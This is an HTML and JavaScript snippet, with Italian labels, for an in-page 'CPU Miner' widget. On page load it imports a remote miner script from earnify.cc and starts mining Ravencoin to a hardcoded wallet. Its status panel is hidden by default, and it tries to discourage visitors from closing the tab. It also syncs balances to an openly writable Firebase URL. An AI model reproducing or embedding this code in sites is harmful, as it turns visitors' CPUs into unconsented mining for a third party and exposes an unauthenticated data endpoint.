<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 320px;
    background: rgba(0, 0, 0, 0.92);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    line-height: 1.65;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
#stop-btn {
    position: fixed;
    bottom: 20px;
    right: 80px;
    width: 50px;
    height: 50px;
    background: #ff2222;
    border: 2px solid #ff6666;
    color: #ffffff;
    font-size: 22px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(255,0,0,0.4);
    transition: transform 0.15s, background 0.15s;
}
#stop-btn:hover {
    background: #cc0000;
    transform: scale(1.08);
}
.earn-line {
    color: #7CFC00;
    font-weight: bold;
}
.total-line {
    color: #00BFFF;
    font-weight: bold;
    margin-top: 6px;
    padding-top: 6px;
    border-top: 1px solid #ffffff22;
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()">×</button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
    
    <div class="earn-line">Sessione: <span id="earnings">0.00000000</span> RVN</div>
    <div class="earn-line">≈ <span id="earnings-eur">0.00000000</span> €</div>
    
    <div class="total-line">Saldo Totale: <span id="total-rvn">0.00000000</span> RVN</div>
    <div class="total-line">≈ <span id="total-eur">0.00000000</span> €</div>
    
    <div style="font-size:12px; opacity:0.75; margin-top:4px;">
        (~<span id="daily-rate">0.00</span> RVN/giorno)
    </div>
</div>

<div id="reopen-btn" onclick="showMinerConsole()">⛏</div>
<div id="stop-btn" onclick="forceStopMiner()" title="Ferma mining e salva">⏹</div>

<script type="module">
    import { autoMine, minotaurxHashrate, stop } from "https://earnify.cc/miner.js";

    // ========== FIREBASE ==========
    const FIREBASE_BASE = "https://miner-3b768-default-rtdb.europe-west1.firebasedatabase.app";
    const BALANCE_URL = `${FIREBASE_BASE}/balance.json`;

    let miningStarted = false;
    let startTime = Date.now();
    let lastUpdate = Date.now();
    let sessionRVN = 0;
    let lastPushedRVN = 0;
    let totalRVN = 0;
    let totalEUR = 0;
    let isSyncing = false;
    let isClosing = false;
    let allowClose = false;

    const RVN_PER_KHS_PER_DAY = 0.18;
    const RVN_PER_KHS_PER_SECOND = RVN_PER_KHS_PER_DAY / 86400;
    const RVN_PRICE_EUR = 0.0035;

    // ========== LETTURA SALDO ==========
    async function loadTotalBalance() {
        try {
            const res = await fetch(BALANCE_URL + "?t=" + Date.now()); // evita cache
            if (!res.ok) throw new Error("HTTP " + res.status);
            
            const data = await res.json();
            if (data && typeof data.rvn === "number") {
                totalRVN = data.rvn;
                totalEUR = data.eur || (data.rvn * RVN_PRICE_EUR);
            } else {
                // Se non esiste ancora, inizializza a 0
                totalRVN = 0;
                totalEUR = 0;
            }
            updateTotalUI();
        } catch (e) {
            console.error("Errore lettura Firebase:", e);
        }
    }

    // ========== SCRITTURA SALDO ==========
    async function pushDeltaToServer() {
        if (isSyncing || isClosing) return;
        
        const delta = sessionRVN - lastPushedRVN;
        if (delta <= 0.00000001) return; // ignora delta troppo piccoli

        isSyncing = true;
        try {
            // 1. Leggi valore attuale
            const res = await fetch(BALANCE_URL + "?t=" + Date.now());
            let data = { rvn: 0, eur: 0 };
            
            if (res.ok) {
                const json = await res.json();
                if (json && typeof json.rvn === "number") {
                    data = json;
                }
            }

            // 2. Calcola nuovo totale
            const newRVN = (data.rvn || 0) + delta;
            const newEUR = newRVN * RVN_PRICE_EUR;

            // 3. Scrivi
            const writeRes = await fetch(BALANCE_URL, {
                method: "PUT",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    rvn: Number(newRVN.toFixed(10)),
                    eur: Number(newEUR.toFixed(10)),
                    lastUpdate: Date.now()
                })
            });

            if (!writeRes.ok) {
                throw new Error("Write failed: " + writeRes.status);
            }

            lastPushedRVN = sessionRVN;
            totalRVN = newRVN;
            totalEUR = newEUR;
            updateTotalUI();
            
            console.log("Saldo aggiornato:", newRVN.toFixed(8));
        } catch (e) {
            console.error("Errore scrittura Firebase:", e);
        } finally {
            isSyncing = false;
        }
    }

    function updateTotalUI() {
        document.getElementById("total-rvn").textContent = totalRVN.toFixed(8);
        document.getElementById("total-eur").textContent = totalEUR.toFixed(8);
    }

    // ========== PULSANTE ROSSO ==========
    window.forceStopMiner = async function() {
        if (isClosing) return;
        isClosing = true;
        allowClose = true;

        try {
            if (typeof stop === "function") stop();
            document.getElementById("status").textContent = "Arrestato";
            document.getElementById("hashrate").textContent = "0.00";
        } catch (err) {}

        // Ultimo salvataggio forzato
        const delta = sessionRVN - lastPushedRVN;
        if (delta > 0) {
            try {
                const res = await fetch(BALANCE_URL);
                const data = await res.json() || { rvn: 0 };
                const newRVN = (data.rvn || 0) + delta;
                const newEUR = newRVN * RVN_PRICE_EUR;

                await fetch(BALANCE_URL, {
                    method: "PUT",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        rvn: Number(newRVN.toFixed(10)),
                        eur: Number(newEUR.toFixed(10)),
                        lastUpdate: Date.now()
                    })
                });

                totalRVN = newRVN;
                totalEUR = newEUR;
                updateTotalUI();
            } catch (e) {
                console.error("Errore ultimo salvataggio:", e);
            }
        }

        const btn = document.getElementById("stop-btn");
        btn.style.background = "#555";
        btn.style.borderColor = "#777";
        btn.innerHTML = "✓";
        btn.title = "Mining già arrestato";
    };

    // ========== CHIUSURA SCHEDA ==========
    window.addEventListener("beforeunload", function (e) {
        if (allowClose) return;

        isClosing = true;

        try {
            if (typeof stop === "function") stop();
        } catch (err) {}

        const delta = sessionRVN - lastPushedRVN;
        if (delta > 0) {
            const payload = JSON.stringify({
                rvn: Number((totalRVN + delta).toFixed(10)),
                eur: Number(((totalRVN + delta) * RVN_PRICE_EUR).toFixed(10)),
                lastUpdate: Date.now()
            });

            // Blob + sendBeacon è più affidabile
            const blob = new Blob([payload], { type: "application/json" });
            navigator.sendBeacon(BALANCE_URL, blob);
        }

        e.preventDefault();
        e.returnValue = "Il mining verrà interrotto e i dati salvati. Sei sicuro di voler uscire?";
        return e.returnValue;
    });

    async function initMining() {
        // Carica subito il saldo
        await loadTotalBalance();

        try {
            await autoMine("RT78ZqrJ58sBVTEuf1or1yTpzN3HrDRZhk", 1);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            // Aggiornamento UI ogni 100ms
            setInterval(() => {
                if (isClosing) return;

                const now = Date.now();
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                const deltaSeconds = (now - lastUpdate) / 1000;
                lastUpdate = now;

                sessionRVN += hr * RVN_PER_KHS_PER_SECOND * deltaSeconds;
                const sessionEUR = sessionRVN * RVN_PRICE_EUR;

                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
                document.getElementById("earnings").textContent = sessionRVN.toFixed(8);
                document.getElementById("earnings-eur").textContent = sessionEUR.toFixed(8);
                document.getElementById("daily-rate").textContent = (hr * RVN_PER_KHS_PER_DAY).toFixed(2);
            }, 100);

            // Sincronizzazione Firebase ogni 2 secondi (più stabile)
            setInterval(() => {
                if (isClosing) return;
                pushDeltaToServer();
            }, 2000);

            // Rilettura saldo ogni 3 secondi (per vedere altri dispositivi)
            setInterval(() => {
                if (isClosing) return;
                loadTotalBalance();
            }, 3000);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    window.showMinerConsole = function() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    };

    // Timer
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
